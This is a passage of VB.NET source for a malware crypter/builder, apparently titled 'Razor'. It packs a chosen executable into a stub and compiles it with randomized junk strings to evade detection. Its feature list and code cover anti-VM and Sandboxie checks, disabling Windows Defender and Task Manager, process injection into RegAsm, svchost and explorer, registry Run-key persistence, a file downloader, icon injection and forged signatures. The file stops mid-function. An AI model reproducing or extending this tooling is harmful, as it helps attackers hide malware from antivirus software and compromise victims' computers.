Imports System.Drawing.Drawing2D
Imports System.ComponentModel
Imports System.Security.Cryptography
Imports System.Text
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.IO.Compression.GZipStream
Imports System.Runtime.CompilerServices
Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Reflection
Imports System.Threading
Imports Microsoft.Win32
Imports System.Net
Imports Microsoft.VisualBasic
Imports System.Management
Imports System.Drawing.Text
Imports ICSharpCode.SharpZipLib.Zip
Imports System.IO.Compression
Imports System.CodeDom.Compiler
Imports Microsoft.CSharp
'_________            .___         .___ __________         __________                            
'\_   ___ \  ____   __| _/____   __| _/ \______   \___.__. \______   \_____  ___________________ 
'/    \  \/ /  _ \ / __ |/ __ \ / __ |   |    |  _<   |  |  |       _/\__  \ \___   /  _ \_  __ \
'\     \___(  <_> ) /_/ \  ___// /_/ |   |    |   \\___  |  |    |   \ / __ \_/    (  <_> )  | \/
' \______  /\____/\____ |\___  >____ |   |______  // ____|  |____|_  /(____  /_____ \____/|__|   
'        \/            \/    \/     \/          \/ \/              \/      \/      \/            


'.NET & Native Files Working.
'Anti Vmware Workstation
'Anti SandBoxie
'Disable Windows Defender
'Disable Task Manager
'Hide Files
'Task Kill
'Process Injection. RegAsm, explorer, svchost
'Delay
'Hidden Startup & Normal Startup
'Assembly Changer
'Digital Signatures
'File Downloader
'Obfuscator
'All Random Codes
'String lengths can be adjusted.
'String can change the names. English & China & Arabic
'Automatic garbage code is reduced by adding detection.
#Region "Main"
Public Class frmMain
    Dim Save As String = ""
    Public Shared Digital_Signature As Boolean
    Private Razor As String = String.Empty
    Private Signatures As Byte()
#Region "Codedom"
    Public Sub Codedom(ByVal Path As String, ByVal Code As String, ByVal MainClass As String)
        Dim providerOptions As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {{"CompilerVersion", "v" + frmSettings.ComboBox4.SelectedItem}}
        Dim cSharpCodeProvider As Microsoft.CSharp.CSharpCodeProvider = New Microsoft.CSharp.CSharpCodeProvider(providerOptions)
        Dim compilerParameters As System.CodeDom.Compiler.CompilerParameters = New System.CodeDom.Compiler.CompilerParameters()
        Dim compilerParameters2 As System.CodeDom.Compiler.CompilerParameters = compilerParameters
        compilerParameters2.GenerateExecutable = True
        compilerParameters2.OutputAssembly = Path
        Dim compilerParameters3 As System.CodeDom.Compiler.CompilerParameters = compilerParameters2
        compilerParameters3.CompilerOptions += "/platform:X86 /target:winexe"
        compilerParameters3 = compilerParameters2
        compilerParameters3.CompilerOptions += " "
        compilerParameters2.MainClass = MainClass
        compilerParameters2.IncludeDebugInformation = False
        compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Web.dll")
        compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        compilerParameters2.ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
        compilerParameters2.ReferencedAssemblies.Add(Application.ExecutablePath)

        Dim compilerResults As System.CodeDom.Compiler.CompilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, New String() {Code})
        Dim flag As Boolean = compilerResults.Errors.Count > 0
        If flag Then
            Try
                Dim enumerator As IEnumerator = compilerResults.Errors.GetEnumerator()
                While enumerator.MoveNext()
                    Interaction.MsgBox(Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(enumerator.Current, Nothing, "ErrorText", New Object(-1) {}, Nothing, Nothing, Nothing))
                End While
            Finally
                Dim enumerator As IEnumerator
                flag = (TypeOf enumerator Is IDisposable)
                If flag Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
#End Region
#Region "RandomString"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim chn As String = "艾诶比西迪伊弗吉尺杰开勒我內普曲氏明德拉拉劇氏瑪我山蛋托克和閃卡雙劇馬闕黑我拉報網德盟雙德本報截和庵爾歐丁喇喬金歐盟本爾諾特底的配迪流金蛋金庵斯流喬拉本歐桃桃拉蛋莎奧伴腿雙桃報和德流喇代德伴德本普和加金歐截截代我瑪山的盟的塔喬拉士庵士問歐爾闕一喬德的嗯斯氏魚本蛋爾底闕氏破特雙伴桃截闕或駛歐盟托氏德普斯曲特和明喇加明進歐底黑破曲盟子和我庵闕本韋曲子的底喬底子士拉迪流或埋歐塔普流諾我進丁德氏加莎爾塔河馬迪爾塔拉山代或德哈托去破馬士一冰特奧子歐桃塔駛明德桃馬網拉喬金德斯马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德士曲冰桃腿丁喇塔截冰雙金的拉闕馬歐韋截莎普諾流斯馬破拉瑪拉本和網盟布魚截卡牛腿明和諾拉拉我卡普哈截破或馬桃一托歐莎德山的爾賃亞內貝和艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        If frmSettings.ComboBox3.SelectedItem = "English" Then
            s = eng
        ElseIf frmSettings.ComboBox3.SelectedItem = "China" Then
            s = chn
        ElseIf frmSettings.ComboBox3.SelectedItem = "Arabic" Then
            s = arb
        ElseIf frmSettings.ComboBox3.SelectedItem = "Hebrew" Then
            s = heb
        ElseIf frmSettings.ComboBox3.SelectedItem = "Mixed" Then
            s = mix
        End If
        Dim sb As New StringBuilder
        For i As Integer = 1 To frmSettings.NumericUpDown6.Value
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Dim ModuleName As String
    Dim ClassName As String
    Public Function RandomClass()
        Dim intUpperNumber As Integer = 8

        Dim r As New Random

        Dim intRandomnumber

        intRandomnumber = r.Next(intUpperNumber)

        Select Case intRandomnumber

            Case 0

                ClassName = "IDefinitionAppId"

            Case 1

                ClassName = "IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS"

            Case 2

                ClassName = "ReferenceIdentity"

            Case 3

                ClassName = "StoreDeploymentMetadataEnumeration"

            Case 4

                ClassName = "BitmapSelector"

            Case 5

                ClassName = "Com2ExtendedUITypeEditor"
            Case 6

                ClassName = "InvariantComparer"
            Case 7

                ClassName = "LocalAppContext"
            Case 8


        End Select
    End Function
    Public Function RandomModuleName()
        Dim intUpperNumber As Integer = 10

        Dim r As New Random

        Dim intRandomnumber

        intRandomnumber = r.Next(intUpperNumber)

        Select Case intRandomnumber

            Case 0

                ModuleName = "ChannelBinding"

            Case 1

                ModuleName = "ExtendedProtectionPolicyTypeConverter"

            Case 2

                ModuleName = "AuthenticationException"

            Case 3

                ModuleName = "FORMATETC"

            Case 4

                ModuleName = "DomainLiteralReader"

            Case 5

                ModuleName = "DeliveryNotificationOptions"
            Case 6

                ModuleName = "CounterDefinitionSample"
            Case 7

                ModuleName = "TryAddToAnyFast"
            Case 8

                ModuleName = "InternetSecurityManager"
            Case 9

                ModuleName = "VBCodeGenerator"
            Case 10

                ModuleName = "GenerateArrayIndexerExpression"

        End Select
    End Function
    Public Function RandomGenerator()
        Randomize()
        Dim a = Int((10 - 1) * Rnd()) + 1
        Return a
    End Function
    Public Function RandomSnype()
        Randomize()
        Dim a = Int((9000 - 1000) * Rnd()) + 1000
        Return a
    End Function
    Public Function RandomNumber()
        Randomize()
        Dim a = Int((200 - 15) * Rnd()) + 15
        Return a
    End Function
#End Region
#Region "Encryption"
    Public Shared Function ZIP(B As Byte(), ByRef CM As Boolean) As Byte()
        Dim flag As Boolean = CM
        Dim result As Byte()
        If flag Then
            Dim obj As Object = New MemoryStream()
            Dim obj2 As Object = New GZipStream(CType(obj, Stream), CompressionMode.Compress, True)
            Dim instance As Object = obj2
            Dim type As Type = Nothing
            Dim memberName As String = "Write"
            Dim array As Object() = New Object() {B, 0, B.Length}
            Dim array2 As Object() = array
            Dim argumentNames As String() = Nothing
            Dim typeArguments As Type() = Nothing
            Dim array3 As Boolean() = New Boolean(2) {}
            array3(0) = True
            Dim array4 As Boolean() = array3
            NewLateBinding.LateCall(instance, type, memberName, array, argumentNames, typeArguments, array3, True)
            If array4(0) Then
                B = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(0)), GetType(Byte())), Byte())
            End If
            NewLateBinding.LateCall(obj2, Nothing, "Dispose", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(obj, Nothing, "Position", New Object() {0}, Nothing, Nothing)
            Dim array5 As Byte() = New Byte(Conversions.ToInteger(NewLateBinding.LateGet(obj, Nothing, "Length", New Object(-1) {}, Nothing, Nothing, Nothing)) + 1 - 1) {}
            Dim instance2 As Object = obj
            Dim type2 As Type = Nothing
            Dim memberName2 As String = "Read"
            Dim array6 As Object() = New Object() {array5, 0, array5.Length}
            array2 = array6
            Dim argumentNames2 As String() = Nothing
            Dim typeArguments2 As Type() = Nothing
            Dim array7 As Boolean() = New Boolean(2) {}
            array7(0) = True
            array4 = array7
            NewLateBinding.LateCall(instance2, type2, memberName2, array6, argumentNames2, typeArguments2, array7, True)
            If array4(0) Then
                array5 = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(0)), GetType(Byte())), Byte())
            End If
            NewLateBinding.LateCall(obj, Nothing, "Dispose", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            result = array5
        Else
            Dim obj3 As Object = New MemoryStream(B)
            Dim obj4 As Object = New GZipStream(CType(obj3, Stream), CompressionMode.Decompress)
            Dim array8 As Byte() = New Byte(3) {}
            NewLateBinding.LateSet(obj3, Nothing, "Position", New Object() {Operators.SubtractObject(NewLateBinding.LateGet(obj3, Nothing, "Length", New Object(-1) {}, Nothing, Nothing, Nothing), 5)}, Nothing, Nothing)
            Dim instance3 As Object = obj3
            Dim type3 As Type = Nothing
            Dim memberName3 As String = "Read"
            Dim array9 As Object() = New Object() {array8, 0, 4}
            Dim array2 As Object() = array9
            Dim argumentNames3 As String() = Nothing
            Dim typeArguments3 As Type() = Nothing
            Dim array10 As Boolean() = New Boolean(2) {}
            array10(0) = True
            Dim array4 As Boolean() = array10
            NewLateBinding.LateCall(instance3, type3, memberName3, array9, argumentNames3, typeArguments3, array10, True)
            If array4(0) Then
                array8 = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(0)), GetType(Byte())), Byte())
            End If
            Dim num As Integer = BitConverter.ToInt32(array8, 0)
            NewLateBinding.LateSet(obj3, Nothing, "Position", New Object() {0}, Nothing, Nothing)
            Dim array11 As Byte() = New Byte(num - 1 + 1 - 1) {}
            Dim instance4 As Object = obj4
            Dim type4 As Type = Nothing
            Dim memberName4 As String = "Read"
            Dim array12 As Object() = New Object() {array11, 0, num}
            array2 = array12
            Dim argumentNames4 As String() = Nothing
            Dim typeArguments4 As Type() = Nothing
            Dim array13 As Boolean() = New Boolean() {True, Nothing, True}
            array4 = array13
            NewLateBinding.LateCall(instance4, type4, memberName4, array12, argumentNames4, typeArguments4, array13, True)
            If array4(0) Then
                array11 = CType(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(0)), GetType(Byte())), Byte())
            End If
            If array4(2) Then
                num = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2(2)), GetType(Integer)))
            End If
            NewLateBinding.LateCall(obj4, Nothing, "Dispose", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(obj3, Nothing, "Dispose", New Object(-1) {}, Nothing, Nothing, Nothing, True)
            result = array11
        End If
        Return result
    End Function
    Public Shared Function Bzip(b2 As Byte()) As Object
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim flag As Boolean = True
        Dim array As Byte() = ZIP(b2, flag)
        For Each value As Byte In array
            stringBuilder.Append(value)
            stringBuilder.Append(",")
        Next
        Return stringBuilder.ToString().Remove(stringBuilder.Length - 1)
    End Function
#End Region
#Region "DotNet"
    Public Shared Function DotNet(bytesdotnet As Byte()) As Boolean
        Dim result As Boolean
        Try
            Assembly.Load(bytesdotnet)
            result = True
        Catch ex As Exception
            result = False
        End Try
        Return result
    End Function
#End Region
#Region "Responsive Sleep"
    Public Sub ResponsiveSleep(ByRef iMilliSeconds As Integer)
        Dim i As Integer, iHalfSeconds As Integer = iMilliSeconds / 500
        For i = 1 To iHalfSeconds
            Threading.Thread.Sleep(500) : Application.DoEvents()
        Next i
    End Sub
#End Region
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim ZGQAk As Mutex = New Mutex(False, "SINGLE_INSTANCE_APP_MUTEX")
        If (ZGQAk.WaitOne(0, False) = False) Then
            ZGQAk.Close()
            ZGQAk = Nothing
            Environment.Exit(1)
        End If
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size
        frmSettings.ComboBox5.SelectedItem = "AppData"
        frmSettings.ComboBox2.SelectedItem = "Normal"
        frmSettings.ComboBox3.SelectedItem = "English"
        frmSettings.ComboBox4.SelectedItem = "2.0"

        Dim Tools As ToolTip = New ToolTip()
        Tools.Active = True
        Tools.UseFading = True
        Tools.UseAnimation = True
        Tools.IsBalloon = True
        Tools.ShowAlways = True
        Tools.AutoPopDelay = 2000
        Tools.ReshowDelay = 200
        Tools.InitialDelay = 100
        Tools.ToolTipIcon = ToolTipIcon.Info
        Tools.SetToolTip(Button5, "Select Your Private Stub File.")
        RandomModuleName()
        RandomClass()
    End Sub
    Private Sub button1_Click(sender As Object, e As EventArgs) Handles button1.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Executable Files (*.exe)|*.exe"
        If Open.ShowDialog = vbOK Then
            TextBox1.Text = Open.FileName
            If DotNet(File.ReadAllBytes(Open.FileName)) Then
                Label10.Text = ".NET File"
            Else
                Label10.Text = "Native File"
            End If
            Dim FileInfo As FileInfo = New FileInfo(Open.FileName)
            Dim Num As Integer = CInt(FileInfo.Length)
            Me.Label9.Text = Conversions.ToString(CDbl(Num) / 1000.0) + " KB"
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Me.TextBox1.Text = "" Then
        Else
            Try
            Catch ex As Exception
            End Try
            Timer4.Enabled = True
        End If
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Icon Files (*.ico)|*.ico"
        If Open.ShowDialog = vbOK Then
            TextBox3.Text = Open.FileName
            PictureBox1.Image = Drawing.Icon.ExtractAssociatedIcon(TextBox3.Text).ToBitmap
        End If
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        RichTextBox1.AppendText(My.Resources.File.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%26%", RandomString()).Replace("%27%", RandomString()).Replace("%28%", RandomString()))
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        RichTextBox1.AppendText(My.Resources.Application.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%26%", RandomString()).Replace("%27%", RandomString()).Replace("%28%", RandomString()))
    End Sub
    Private Sub Button4_Click_1(sender As Object, e As EventArgs) Handles Button4.Click
        frmSettings.Show()
    End Sub
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        RichTextBox1.AppendText(My.Resources._String.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%26%", RandomString()).Replace("%27%", RandomString()).Replace("%28%", RandomString()))
    End Sub

    Public Shared Sub Load(Path As String, Code As String, MainClass As String)
        Dim csharpCodeProvider As CSharpCodeProvider = New CSharpCodeProvider(New Dictionary(Of String, String)() From {{"CompilerVersion", "v4.0"}})
        Dim compilerParameters As CompilerParameters = New CompilerParameters()
        Dim compilerParameters2 As CompilerParameters = compilerParameters
        compilerParameters2.GenerateExecutable = True
        compilerParameters2.OutputAssembly = Path
        Dim compilerParameters3 As CompilerParameters = compilerParameters2
        Dim compilerParameters4 As CompilerParameters = compilerParameters3
        compilerParameters3.CompilerOptions = compilerParameters4.CompilerOptions + " /optimize+ /platform:x86 /target:winexe /unsafe "
        compilerParameters2.MainClass = MainClass
        compilerParameters2.IncludeDebugInformation = True
        compilerParameters2.ReferencedAssemblies.Add("System.Core.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Data.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Deployment.dll")
        compilerParameters2.ReferencedAssemblies.Add("Microsoft.CSharp.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Drawing.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Xml.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Xml.Linq.dll")
        compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Management.dll")
        compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.Data.Linq.dll")
        compilerParameters2.ReferencedAssemblies.Add("System.ServiceProcess.dll")

        'compilerParameters2.EmbeddedResources.Add(Application.StartupPath & "\search_50px.png")


        Dim compilerResults As CompilerResults = csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, New String() {Code})
        If compilerResults.Errors.Count > 0 Then
            Try
                For Each obj As Object In compilerResults.Errors
                    Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
                    Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, Nothing, "ErrorText", New Object(-1) {}, Nothing, Nothing, Nothing)), MsgBoxStyle.OkOnly, Nothing)

                Next
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
    Public Function Normal()
        Try
            If frmSettings.ComboBox2.Text = "" Then
                TextBox10.Text = "Application.ExecutablePath"
            End If
            If frmSettings.ComboBox2.SelectedItem = "Normal" Then
                TextBox10.Text = "Application.ExecutablePath"
            ElseIf frmSettings.ComboBox2.SelectedItem = "RegAsm" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "MsBuild" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "vbc" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "svchost" Then
                TextBox10.Text = """C:\\Windows\\System32\\svchost.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "schtasks" Then
                TextBox10.Text = """C:\\Windows\\System32\\schtasks.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "explorer" Then
                TextBox10.Text = """C:\\Windows\\explorer.exe"""
            End If
            If frmSettings.RadioButton1.Checked = True Then
                frmSettings.TextBox9.Text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            End If
            If frmSettings.RadioButton2.Checked = True Then
                frmSettings.TextBox9.Text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            End If
            If frmSettings.ComboBox5.SelectedItem = "AppData" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.ApplicationData"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Desktop" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.Desktop"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Program Files" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.ProgramFiles"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Documents" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.MyDocuments"
            End If
            Dim nbsaWumrcpYk As String = My.Resources.Razor1
            nbsaWumrcpYk = nbsaWumrcpYk.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%28%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%44%", RandomString()).Replace("%26%", RandomString()).Replace("%27%", RandomString()).Replace("%29%", RandomString()).Replace("%Razor%", Bzip(File.ReadAllBytes(TextBox1.Text))).Replace("%Title%", frmSettings.TextBox8.Text()).Replace("%Description%", frmSettings.TextBox4.Text()).Replace("%Company%", frmSettings.TextBox5.Text()).Replace("%Product%", frmSettings.TextBox6.Text()).Replace("%Copyright%", frmSettings.TextBox7.Text()).Replace("%A%", frmSettings.NumericUpDown2.Value()).Replace("%B%", frmSettings.NumericUpDown3.Value()).Replace("%C%", frmSettings.NumericUpDown4.Value()).Replace("%E%", frmSettings.NumericUpDown5.Value()).Replace("%Path%", TextBox2.Text()).Replace("%Download Name%", frmSettings.TextBox3.Text()).Replace("%Link%", frmSettings.TextBox2.Text()).Replace("%Inject%", TextBox10.Text()).Replace("%Sleep%", frmSettings.TextBox1.Text + "000").Replace("%Task Kill%", frmSettings.TextBox10.Text).Replace("%30%", RandomString()).Replace("%31%", RandomString()).Replace("%32%", RandomString()).Replace("%33%", RandomString()).Replace("%34%", RandomString()).Replace("%FolderName%", frmSettings.TextBox11.Text()).Replace("%Folder Path%", frmSettings.TextBox14.Text()).Replace("%Name%", frmSettings.TextBox12.Text()).Replace("%Startup File Name%", frmSettings.TextBox13.Text()).Replace("%35%", RandomString()).Replace("%36%", RandomString()).Replace("%37%", RandomString()).Replace("%Regedit%", frmSettings.TextBox9.Text()).Replace("%ModuleName%", ModuleName).Replace("%RandomClass%", ClassName)
            RichTextBox1.Text = nbsaWumrcpYk
            Clipboard.SetText(RichTextBox1.Text)
            If frmSettings.CheckBox6.Checked Then
                Timer1.Start()
                Timer2.Start()
                ResponsiveSleep(frmSettings.NumericUpDown1.Value)
            Else
            End If
            If frmSettings.CheckBox7.Checked Then
                Timer3.Start()
                ResponsiveSleep(frmSettings.NumericUpDown1.Value)
            Else
            End If
            If frmSettings.CheckBox12.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Task Kill", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Task Kill", "//" + RandomString())
            End If
            If frmSettings.CheckBox10.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Sleep", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Sleep", "//" + RandomString())
            End If
            If frmSettings.CheckBox4.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Disable Task Manager", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Disable Task Manager", "//" + RandomString())
            End If
            If frmSettings.CheckBox14.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Normal Startup", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Normal Startup", "//" + RandomString())
            End If
            If frmSettings.CheckBox13.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Hide File", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Hide File", "//" + RandomString())
            End If
            If frmSettings.CheckBox11.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Download", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Download", "//" + RandomString())
            End If
            If frmSettings.CheckBox5.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Disable Windows Defender", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Disable Windows Defender", "//" + RandomString())
            End If
            If frmSettings.CheckBox3.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Detect SandBoxie", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Detect SandBoxie", "//" + RandomString())
            End If
            If frmSettings.CheckBox2.Checked = True Then
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Detect Virtual Machine", Nothing)
            Else
                RichTextBox1.Text = Replace(RichTextBox1.Text, "//Detect Virtual Machine", "//" + RandomString())
            End If
            Load(Save, RichTextBox1.Text, Nothing)

            If TextBox3.Text = "" Then
            Else
                IconInjector.InjectIcon(Save, TextBox3.Text)
            End If
            'If frmSettings.RadioButton7.Checked = True Then
            '    Me.Signatures = My.Resources.Microsoft_Corporation
            '    File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            'End If
